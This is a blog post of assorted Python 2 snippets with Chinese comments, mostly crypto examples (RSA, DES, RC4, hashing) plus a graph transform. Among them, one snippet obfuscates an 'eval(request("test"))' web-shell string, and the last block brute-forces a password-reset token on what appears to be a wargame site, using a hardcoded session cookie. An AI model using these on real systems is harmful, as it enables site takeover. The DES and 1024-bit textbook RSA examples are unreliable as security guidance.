---
title: Some python codes
author: tank96a
layout: post
categories:
  - article
tags:
  - python
---

一些有用的python代码片段

{% highlight python %}
from base64 import b64decode,b32decode
s='R1FZVElNWlZHUTJETU4yQ0dVM1RNTkpXSU0zREdOU0dHWkNETU5KVklZM1RJTlNHR1ZERElNSlVHTTJUSU5CV0dNWkRHTUJUR0VaVEtOS0dHUVlUSVFSVUdFMlVNTkNFR1E0VEtNWlVHTTJER05KVUdRM0RLUlJVSU0yRU1OQ0RHNUNBPT09PQ=='
s1= b64decode(s)
print b32decode(s1).decode('hex')

#获取代码运行时间
from  timeit import Timer 
def test1():
    l = [i for i in range(1000)]
def test2():
    l = list(range(1000))
    
t1 = Timer("test1()", "from __main__ import test1")
print("comprehension ",t1.timeit(number=1000), "milliseconds")
t2 = Timer("test2()", "from __main__ import test2")
print("list range ",t2.timeit(number=1000), "milliseconds")
{% endhighlight %}

[Python and cryptography with pycrypto](http://blog.csdn.net/lxgwm2008/article/details/9287481)
{% raw %}
<pre>
RSA 运算
root@kali:~/Desktop# openssl --help
root@kali:~/Desktop# openssl genrsa --help
root@kali:~/Desktop# openssl genrsa -out mykey.pem
Generating RSA private key, 1024 bit long modulus
e is 65537 (0x10001)
root@kali:~/Desktop# openssl rsa -help
root@kali:~/Desktop# openssl rsa -in mykey.pem -pubout > mykey.pub

from Crypto.PublicKey import RSA
text = "My test!"
pub_key = RSA.importKey(open('mykey.pub'))
# the second parameter for compatibility only,'' will be ok. Return a tuple with two items.
#The first item is the ciphertext,The second item is always None.
x = pub_key.encrypt(text, '')  
pri_key = RSA.importKey(open('mykey.pem'))
decrypted_text = pri_key.decrypt(x[0])
print decrypted_text
--------------------------------------------------
from Crypto.PublicKey import RSA
from Crypto import Random
random_generator = Random.new().read
key = RSA.generate(1024, random_generator)
c=key.publickey().encrypt('Hello world!','')[0]
print key.decrypt(c)
pub_key =  key.publickey().exportKey()
pri_key = key.exportKey()
print pub_key+'\n\n'+pri_key
</pre>
{% endraw %}

{% highlight python %}
#DES运算
from Crypto.Cipher import DES
from Crypto import Random
text="My test!"
key='12345678' #It must be 8 byte long.
iv = Random.get_random_bytes(8)
des = DES.new(key,DES.MODE_CBC,iv)
reminder = len(text)%8
text+=chr(8-reminder)* (8-reminder)
c=des.encrypt(text)
des1 = DES.new(key,DES.MODE_CBC,iv)
p=des1.decrypt(c)
padNum = ord(p[-1])
print p[:-padNum]

#rc4运算
from Crypto.Cipher import ARC4
obj1 = ARC4.new('0CTF2015')
c= obj1.encrypt('0CTF{Backdoor&Obfuscation_In_Execution_Environment}')
print c.encode('hex') 
obj2 = ARC4.new('0CTF2015')
print obj2.decrypt(c)
{% endhighlight %}

{% highlight python %}
import uuid
import hashlib
deskey = hashlib.md5(uuid.uuid1().hex).hexdigest()[:8]

from Crypto.Hash import MD5
print MD5.new('admin888').hexdigest()
---------------------------------------------------
import base64
print base64.b64decode(base64.b64encode('123'))

import hashlib
s='test'.encode('rot13').encode('base64')
print s.decode('base64').decode('rot13')
----------------------------------------------------


{% endhighlight %}


{% highlight python %}
class Graph(object):
    def __init__(self, vertexNum=0, edges=0):
        self.EdgeNo = edges  # Edge counter.
        self.vertList =[[] for i in range(vertexNum)]  # Adjacency lists for each vertex.

    # Adds an edge between vertex number x and y
    def addEdge(self, x, y):  
        assert x != y
        self.vertList[x].append((y, self.EdgeNo))
        self.vertList[y].append((x, self.EdgeNo))
        self.EdgeNo += 1

    def printme(self):
        print len(self.vertList), self.EdgeNo
        for i in range(len(self.vertList)):
            for ref, cc in reversed(self.vertList[i]):
                if ref > i:
                    print i + 1, ref + 1

def toLineGraph(gra):  # Performs the line graph transform
    newGra = Graph(vertexNum=gra.EdgeNo)
    for vertex in gra.vertList:# for each vertex
        for i in range(len(vertex)):
            for e in range(i + 1, len(vertex)):
                # for each pair of its edges, make an edge between them
                newGra.addEdge(vertex[-i - 1][1], vertex[-e - 1][1])
    return newGra

def buildGraph(s):
    gra = Graph(len(s) + 2 + sum(ord(c) - ord('0') for c in s))
    for i in range(len(s) + 1):
        gra.addEdge(i, i + 1)
    lenxx = len(s) + 2
    for i in range(len(s)):
        for _ in range(ord(s[i]) - ord('0')):
            gra.addEdge(i + 1, lenxx)
            lenxx += 1
    return gra
    
toLineGraph(toLineGraph(buildGraph('123'))).printme()
{% endhighlight %}

{% highlight python %}
import string
def dec(s,key):
    ss=''
    for i in range(0,len(s),2):
        if s[i] in string.digits:
            j = (i/2 +1)%len(key)
            ss += chr(string.atoi(s[i:i+2],16)-string.atoi(key[j]))
    return ss
def enc(s,key):
    ss=''
    for i in range(len(s)):
        j = (i+1)%len(key)
        ss+=hex(ord(s[i]) + string.atoi(key[j]))[2:4]    
    return ss
print dec("6b7d69712e796d767b6c7b792e297c6a797b2a2e2f","5678")
print enc('eval(request("test"))','5678')
{% endhighlight %}

{% highlight python %}
#requests模块的使用
方法1：
import requests
import hashlib
s = requests.Session()
header = {'Cookie': 'saeut=125.122.24.125.1416063016314663; PHPSESSID=45204efb16a5fba91c9159e1fe65b0e5'}
for x in xrange(615, 1000):
    pwd = hashlib.new('md5', '1417336' + str(x)).hexdigest()
    url = 'http://1.hacklist.sinaapp.com/password1_dc178aa12e73cfc184676a4100e07dac/reset.php?sukey=' + pwd + '&username=admin'
    r = s.get(url, headers=header)
    if r.content != '':
        print r.content
        break
    else:
        print '正在破解中……', pwd
方法2：
import requests
import hashlib
import time
s = requests.Session()
header = {'Cookie': 'saeut=125.122.24.125.1416063016314663; PHPSESSID=45204efb16a5fba91c9159e1fe65b0e5'}
while True:
    pwd = hashlib.new('md5', str(int(time.time()))).hexdigest()
    url = 'http://1.hacklist.sinaapp.com/password1_dc178aa12e73cfc184676a4100e07dac/reset.php?sukey=' + pwd + '&username=admin'
    r = s.get(url, headers=header)
    time.sleep(0.8)
    if r.content != '':
       同上省略.....
{% endhighlight %}

{% highlight python %}
{% endhighlight %}

{% highlight python %}
{% endhighlight %}
